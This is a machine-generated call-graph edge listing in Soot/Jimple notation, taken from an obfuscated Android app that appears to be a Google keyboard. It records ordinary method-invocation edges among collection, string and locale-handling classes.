STATIC edge: $r6 = staticinvoke <ivw: java.lang.String l(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: java.lang.String l(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object[],int)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<lki: void <init>(java.lang.Object,java.lang.Object)>($r0, $r1) in <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)> ==> <lki: void <init>(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r14.<lvt: boolean a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: boolean a()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean containsAll(java.util.Collection)>($r4) in <lqs: boolean equals(java.lang.Object)> ==> <lqs: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(11) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int rotateLeft(int,int)>($i0, 15) in <izw: int ac(int)> ==> <java.lang.Integer: int rotateLeft(int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void c()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: void c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsu: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lji: void <init>(java.util.Comparator)>($r0) in <lqd: lqd b(java.util.Comparator)> ==> <lji: void <init>(java.util.Comparator)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $l4 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long get()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long get()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmp: void <init>()> ==> <lma: void <init>()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStickerSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i1 = staticinvoke <java.lang.Math: int max(int,int)>($i1, 2) in <lma: int e(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lkq: java.util.Iterator iterator()>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int size()>() in <liy: int size()> ==> <ljd: int size()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] x()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>($r2, $r1, $i0, r0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractCollection: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lvt: void <init>(lvr)>($r3) in <lvt: void <clinit>()> ==> <lvt: void <init>(lvr)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.Object w(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r6.<lly: void j(java.lang.Object)>($r8) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: void j(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i1 = interfaceinvoke $r2.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lrg: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r9.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(64) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean isEmpty()>() in <ljf: int c()> ==> <ljf: boolean isEmpty()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<ltc: void <init>(java.lang.String,int,int)>("FULL", 3, $i0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: staticinvoke <iye: void D(boolean,java.lang.String,int,int)>(1, "min (%s) must be less than or equal to max (%s)", $i0, $i1) in <kwe: int U(int,int,int)> ==> <iye: void D(boolean,java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lkq: void <init>()> ==> <lkh: void <init>()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r3) in <ljb: java.lang.Object getValue()> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r1) in <iye: void Q(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.util.Iterator l()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=null") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>($z0, "collection too large") in <lma: int e(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r2.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.Object cast(java.lang.Object)>($r2) in <lsz: java.lang.Object d(java.lang.Object)> ==> <java.lang.Class: java.lang.Object cast(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<hcb: java.lang.Object l(java.lang.String,ldp)>($r2, $r4) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: java.lang.Object l(java.lang.String,ldp)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(short[],short)>($r7, $s8) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(short[],short)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>("Both parameters are null") in <iye: java.lang.Object V(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <lkt: void e(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lnc: void <init>(java.lang.Object)> ==> <lsa: void <init>()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.util.ArrayList: void <init>()>() in <lri: java.util.ArrayList N()> ==> <java.util.ArrayList: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStaticImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int indexOf(java.lang.String,int)>("%s", $i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int indexOf(java.lang.String,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object k(int)>
STATIC edge: $r2 = staticinvoke <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>($r1, $i0) in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAnimatedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r12 = virtualinvoke r0.<lsn: lts l()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: lts l()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("\\p{Punct}*") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
CLINIT edge: staticinvoke <lkq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkq: void <clinit>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(8) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsa: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.StringBuilder: void <init>()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r6) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lly: void <init>()>() in <lma: lly g()> ==> <lly: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
CLINIT edge: staticinvoke <hcb: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hcb: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lmp: void <init>()>() in <lmo: void <init>(java.util.Comparator)> ==> <lmp: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r14.<lkl: lkq g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: lkq g()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(6) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r0.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r1) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.util.LinkedHashSet: void <init>(java.util.Collection)>($r2) in <ose: void <clinit>()> ==> <java.util.LinkedHashSet: void <init>(java.util.Collection)>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: java.lang.Object next()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljd: java.util.Map o()>() in <ljb: java.lang.Object getValue()> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r2, $i0, $i0, $r1) in <j$.util.concurrent.e: java.util.Iterator iterator()> ==> <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $r1 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r2) in <lma: lma p(java.util.Collection)> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r18.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_SEARCH", 18, 18) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: lma q()>() in <llo: lma u()> ==> <lkx: lma q()>
SPECIAL edge: specialinvoke $r4.<liw: void <init>(ljd)>(r0) in <ljd: java.util.Iterator l()> ==> <liw: void <init>(ljd)>
